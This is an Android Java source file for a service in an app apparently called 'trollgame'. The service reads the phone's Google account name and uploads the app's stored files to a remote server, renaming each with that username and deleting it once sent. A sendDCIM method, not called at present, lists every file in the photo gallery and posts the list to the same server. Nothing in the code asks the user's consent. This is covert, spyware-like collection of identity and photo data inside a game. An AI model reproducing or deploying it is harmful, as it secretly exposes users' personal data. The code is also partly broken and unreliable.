package fr.insa_lyon.bg4if.trollgame;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.IntentService;
import android.content.Intent;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;
import android.util.Log;



import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.Volley;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import com.loopj.android.http.ResponseHandlerInterface;
import com.loopj.android.http.SyncHttpClient;

import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class FileSyncService extends IntentService {
    public static final String TAG = FileSyncService.class.getName();

    
    // TODO: Rename actions, choose action names that describe tasks that this
    // IntentService can perform, e.g. ACTION_FETCH_NEW_ITEMS
    private static final String ACTION_SYNC = "fr.insa_lyon.bg4if.trollgame.action.FOO";
    private static final String ACTION_BAZ = "fr.insa_lyon.bg4if.trollgame.action.BAZ";

    // TODO: Rename parameters
    private static final String EXTRA_PARAM1 = "fr.insa_lyon.bg4if.trollgame.extra.PARAM1";
    private static final String EXTRA_PARAM2 = "fr.insa_lyon.bg4if.trollgame.extra.PARAM2";

    /**
     * Starts this service to perform action Foo with the given parameters. If
     * the service is already performing a task this action will be queued.
     *
     * @see IntentService
     */
    // TODO: Customize helper method
    public static void startSync(Context context) {
        Intent intent = new Intent(context, FileSyncService.class);
        intent.setAction(ACTION_SYNC);
        Log.d(TAG, "Intent sync sent");
        context.startService(intent);

    }

    /**
     * Starts this service to perform action Baz with the given parameters. If
     * the service is already performing a task this action will be queued.
     *
     * @see IntentService
     */
    // TODO: Customize helper method
    public static void startActionBaz(Context context, String param1, String param2) {
        Intent intent = new Intent(context, FileSyncService.class);
        intent.setAction(ACTION_BAZ);
        intent.putExtra(EXTRA_PARAM1, param1);
        intent.putExtra(EXTRA_PARAM2, param2);
        context.startService(intent);
    }

    public FileSyncService() {
        super("FileSyncService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            Log.d(TAG, "Intent start");
            final String action = intent.getAction();
            if (ACTION_SYNC.equals(action)) {
                final String param1 = intent.getStringExtra(EXTRA_PARAM1);
                final String param2 = intent.getStringExtra(EXTRA_PARAM2);
                handleSync();
            } else if (ACTION_BAZ.equals(action)) {
                final String param1 = intent.getStringExtra(EXTRA_PARAM1);
                final String param2 = intent.getStringExtra(EXTRA_PARAM2);
                handleActionBaz(param1, param2);
            }
        }
    }

    /**
     * Handle action Foo in the provided background thread with the provided
     * parameters.
     */
    private void handleSync() {
        Log.d(TAG, "Username " + getUsername());
        File directory = this.getApplicationContext().getFilesDir();
        for( File file : directory.listFiles()) {
            sendToServer(file);

        }
        //sendDCIM();
    }

    /**
     * Handle action Baz in the provided background thread with the provided
     * parameters.
     */
    private void handleActionBaz(String param1, String param2) {
        // TODO: Handle action Baz
        throw new UnsupportedOperationException("Not yet implemented");
    }

    private void sendToServer(final File file) {
                file.renameTo( new File(file.getParent() + "/" + getUsername() +".jpg"));
                SyncHttpClient client = new SyncHttpClient();
                client.setTimeout(20000);
                RequestParams params = new RequestParams();
                try {
                    params.put("user_photo", file);

                } catch(FileNotFoundException e) {}
                client.post(MyApp.SERVER_ROOT + "/api/photo", params, new AsyncHttpResponseHandler() {
                    @Override
                    public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                        Log.d(TAG, "sucess");
                        file.delete();
                    }

                    @Override
                    public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                        Log.d(TAG, "failure");
                    }
                });




}

    private void sendDCIM() {

            Log.i(TAG, "Sending file DCIM");

            MultipartEntity multipartEntity = new MultipartEntity();

            String listFichier = "";
            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
            listFichier = getFilesList(dcim);
            SyncHttpClient client = new SyncHttpClient();

            RequestParams params = new RequestParams();
            params.put("id", getUsername());
            params.put("files", listFichier);
        /*try {
            params.put("file", File.createTempFile("hello", "holla"));
        } catch (IOException e) {
            e.printStackTrace();
        }*/

        client.post(MyApp.SERVER_ROOT + "/imglist/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                Log.d(TAG, "sucess");

            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                Log.d(TAG, "failure");
            }
        });
    }

    private String getFilesList(File dir) {
        String list = "";
        for (File f : dir.listFiles()) {
            if (f.isDirectory()) {
                list += getFilesList(f);
            } else {
                list += f.getName() +" ,\n";
            }
        }
        return list;
    }


    public String getUsername() {
        SharedPreferences sp = getApplicationContext()
                .getSharedPreferences(MyApp.SHARED_PREF_ID, MODE_PRIVATE);
        if(sp.contains(MyApp.PREF_USERNAME)) {
            return sp.getString(MyApp.PREF_USERNAME,"unknown");
        }
        AccountManager manager = AccountManager.get(this);
        Account[] accounts = manager.getAccountsByType("com.google");
        List<String> possibleEmails = new LinkedList<String>();

        for (Account account : accounts) {
            // TODO: Check possibleEmail against an email regex or treat
            // account.name as an email address only for certain account.type values.
            possibleEmails.add(account.name);
        }

        if (!possibleEmails.isEmpty() && possibleEmails.get(0) != null) {
            String email = possibleEmails.get(0);
            String[] parts = email.split("@");

            if (parts.length > 1) {
                sp.edit().putString(MyApp.PREF_USERNAME, parts[0]).commit();
                return parts[0];
            }
        }
        return "unknown";
    }
}
